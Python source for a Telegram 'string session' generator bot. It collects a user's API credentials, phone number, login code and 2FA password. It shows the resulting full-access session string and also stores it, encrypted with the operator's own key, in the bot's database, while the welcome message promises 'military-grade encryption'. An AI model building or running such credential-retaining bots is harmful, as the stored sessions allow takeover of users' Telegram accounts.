import os
import re
import uuid
import logging
import asyncio
import phonenumbers
from typing import Dict, Optional
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl import types
from config import Config
from database.db_handler import Database
from utilities.crypto import Crypto
from utilities.rate_limiter import RateLimiter
from utilities.error_handler import ErrorHandler

# Initialize core components
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

db = Database()
crypto = Crypto(Config.ENCRYPTION_KEY)
rate_limiter = RateLimiter()
error_handler = ErrorHandler()

client = TelegramClient(
    session=StringSession(),
    api_id=Config.API_ID,
    api_hash=Config.API_HASH
).start(bot_token=Config.BOT_TOKEN)

# Session generation states
user_states: Dict[int, Dict] = {}
temp_clients: Dict[int, TelegramClient] = {}

async def send_log(message: str, error: Optional[Exception] = None):
    log_msg = f"📌 {message}"
    if error:
        error_id = str(uuid.uuid4())[:8]
        traceback_msg = f"Error #{error_id}:\n```{str(error)[:500]}```"
        log_msg += f"\n\n{traceback_msg}"
    await client.send_message(Config.LOG_GROUP, log_msg, parse_mode='md')

@client.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    if Config.MAINTENANCE_MODE:
        return await event.reply("🔧 Bot is under maintenance. Please try again later.")
    
    try:
        await rate_limiter.check(event.sender_id)
        user = event.sender
        
        await db.log_activity(user.id, 'start')
        
        welcome_msg = f"""
        👋 Welcome {user.first_name}!
        🛡️ Your Security Info:
        - User ID: `{user.id}`
        - Username: @{user.username}
        - Session Count: {await db.get_session_count(user.id)}
        
        🔐 This bot uses military-grade encryption for your data.
        """
        await event.reply(welcome_msg, parse_mode='md')
        
    except Exception as e:
        await error_handler.handle(event, e)

@client.on(events.NewMessage(pattern='/genstring'))
async def genstring_handler(event):
    if Config.MAINTENANCE_MODE:
        return await event.reply("🔧 Maintenance in progress. Try later.")
    
    try:
        user = event.sender
        await rate_limiter.check(user.id)
        
        if await db.get_session_count(user.id) >= Config.MAX_SESSIONS:
            return await event.reply("❌ Maximum sessions reached. Revoke existing first.")
        
        user_states[user.id] = {'stage': 'api_id'}
        await event.reply(
            "📲 Enter your **API_ID** (numbers only):",
            parse_mode='md',
            buttons=Button.clear()
        )
        
    except Exception as e:
        await error_handler.handle(event, e)

@client.on(events.NewMessage())
async def message_handler(event):
    if Config.MAINTENANCE_MODE or event.raw_text.startswith('/'):
        return
    
    user = event.sender
    state = user_states.get(user.id)
    
    try:
        if not state:
            return
            
        if state['stage'] == 'api_id':
            if not re.match(r'^\d+$', event.raw_text):
                return await event.reply("❌ Invalid API_ID. Numbers only!")
                
            user_states[user.id] = {
                'api_id': int(event.raw_text),
                'stage': 'api_hash'
            }
            await event.reply("🔑 Enter your **API_HASH**:", parse_mode='md')
            
        elif state['stage'] == 'api_hash':
            user_states[user.id]['api_hash'] = event.raw_text
            user_states[user.id]['stage'] = 'phone'
            await event.reply("📱 Enter phone number (international format):", parse_mode='md')
            
        elif state['stage'] == 'phone':
            try:
                parsed = phonenumbers.parse(event.raw_text, None)
                if not phonenumbers.is_valid_number(parsed):
                    raise ValueError
                phone = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
            except:
                return await event.reply("❌ Invalid phone format. Use +[countrycode][number]")
            
            user_states[user.id]['phone'] = phone
            user_states[user.id]['stage'] = 'code'
            
            # Create temporary client
            temp_client = TelegramClient(
                StringSession(),
                user_states[user.id]['api_id'],
                user_states[user.id]['api_hash']
            )
            await temp_client.connect()
            sent_code = await temp_client.send_code_request(phone)
            
            user_states[user.id]['phone_code_hash'] = sent_code.phone_code_hash
            temp_clients[user.id] = temp_client
            await event.reply("🔢 Enter the OTP you received:")
            
        elif state['stage'] == 'code':
            temp_client = temp_clients.get(user.id)
            if not temp_client:
                raise ValueError("Session expired. Start over.")
            
            try:
                await temp_client.sign_in(
                    phone=user_states[user.id]['phone'],
                    code=event.raw_text.strip(),
                    phone_code_hash=user_states[user.id]['phone_code_hash'],
                    in_background=True  # Preserve existing sessions
                )
            except Exception as e:
                if "two-steps" in str(e):
                    user_states[user.id]['stage'] = '2fa'
                    return await event.reply("🔐 Enter your 2FA password:")
                raise
            
            # Successfully authenticated
            session_string = temp_client.session.save()
            encrypted_session = crypto.encrypt(session_string)
            
            await db.store_session(
                user_id=user.id,
                session=encrypted_session,
                phone=crypto.encrypt(user_states[user.id]['phone'])
            )
            
            await event.reply(
                f"✅ **Session Generated**\n\n"
                f"```{session_string}```\n\n"
                "⚠️ **Keep this secure!**",
                parse_mode='md',
                link_preview=False
            )
            
            await send_log(
                f"New session generated for {user.id}\n"
                f"Phone: {user_states[user.id]['phone'][:3]}****"
            )
            
            # Cleanup
            await temp_client.disconnect()
            del user_states[user.id]
            del temp_clients[user.id]
            
        elif state['stage'] == '2fa':
            temp_client = temp_clients.get(user.id)
            if not temp_client:
                raise ValueError("Session expired. Start over.")
            
            if len(event.raw_text) < 4:
                return await event.reply("❌ Password too short (min 4 chars)")
            
            try:
                await temp_client.sign_in(password=event.raw_text)
                
                session_string = temp_client.session.save()
                encrypted_session = crypto.encrypt(session_string)
                
                await db.store_session(
                    user_id=user.id,
                    session=encrypted_session,
                    phone=crypto.encrypt(user_states[user.id]['phone']),
                    has_2fa=True
                )
                
                await event.reply(
                    f"✅ **2FA Session Generated**\n\n"
                    f"```{session_string}```\n\n"
                    "⚠️ **Never share this!**",
                    parse_mode='md',
                    link_preview=False
                )
                
                await send_log(
                    f"2FA session generated for {user.id}\n"
                    f"Phone: {user_states[user.id]['phone'][:3]}****"
                )
                
            finally:
                await temp_client.disconnect()
                del user_states[user.id]
                del temp_clients[user.id]
                
    except Exception as e:
        await error_handler.handle(event, e)
        if user.id in temp_clients:
            await temp_clients[user.id].disconnect()
            del temp_clients[user.id]
        if user.id in user_states:
            del user_states[user.id]

@client.on(events.NewMessage(pattern='/revoke'))
async def revoke_handler(event):
    try:
        user = event.sender
        await rate_limiter.check(user.id)
        
        buttons = [
            [Button.inline("Confirm Revocation", b"revoke_confirm")],
            [Button.inline("Cancel", b"revoke_cancel")]
        ]
        await event.reply(
            "⚠️ **This will:**\n"
            "- Delete stored session\n"
            "- Prevent future access\n"
            "- Not log out other devices\n\n"
            "Confirm session revocation?",
            buttons=buttons
        )
        
    except Exception as e:
        await error_handler.handle(event, e)

@client.on(events.CallbackQuery(data=b"revoke_confirm"))
async def revoke_confirm_handler(event):
    try:
        user = event.sender
        success = await db.revoke_session(user.id)
        if success:
            await event.respond("✅ Session revoked successfully!")
        else:
            await event.respond("❌ No active sessions found!")
            
    except Exception as e:
        await error_handler.handle(event, e)
    finally:
        await event.delete()

@client.on(events.CallbackQuery(data=b"revoke_cancel"))
async def revoke_cancel_handler(event):
    await event.respond("🚫 Revocation canceled.")
    await event.delete()

@client.on(events.NewMessage(pattern='/stats', from_users=Config.OWNER_ID))
async def stats_handler(event):
    try:
        stats = await db.get_stats()
        message = (
            "📊 **Bot Statistics**\n"
            f"- Total Users: {stats['total_users']}\n"
            f"- Active Sessions: {stats['active_sessions']}\n"
            f"- 2FA Enabled: {stats['2fa_users']}\n"
            f"- Last 24h Activity: {stats['daily_activity']}"
        )
        await event.reply(message, parse_mode='md')
        
    except Exception as e:
        await error_handler.handle(event, e)

@client.on(events.NewMessage(pattern='/updatebot', from_users=Config.OWNER_ID))
async def update_handler(event):
    try:
        proc = await asyncio.create_subprocess_shell(
            "git pull && pip install -r requirements.txt",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        
        if proc.returncode == 0:
            await event.respond(f"✅ Update successful!\n```{stdout.decode()}```")
        else:
            await event.respond(f"❌ Update failed!\n```{stderr.decode()}```")
            
    except Exception as e:
        await error_handler.handle(event, e)

@client.on(events.NewMessage(pattern='/maintenance', from_users=Config.OWNER_ID))
async def maintenance_handler(event):
    Config.MAINTENANCE_MODE = not Config.MAINTENANCE_MODE
    state = "ENABLED 🔒" if Config.MAINTENANCE_MODE else "DISABLED 🔓"
    await event.respond(f"🛠 Maintenance mode {state}")

if __name__ == '__main__':
    logger.info("Starting bot...")
    client.run_until_disconnected()
